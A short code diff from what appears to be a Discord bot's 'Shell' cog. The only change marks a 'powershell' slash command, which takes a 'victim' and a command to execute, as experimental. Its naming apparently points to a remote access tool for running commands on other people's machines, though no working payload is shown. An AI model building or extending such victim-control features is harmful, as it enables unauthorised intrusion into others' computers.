@@ -51,7 +51,7 @@ class Shell(commands.Cog):
 
     @commands.slash_command( )
     async def powershell(self, ctx, victim, command): 
-        """Executes powershell commands
+        """[EXPERIMENTAL] Executes powershell commands
         
         Parameters
         ----------
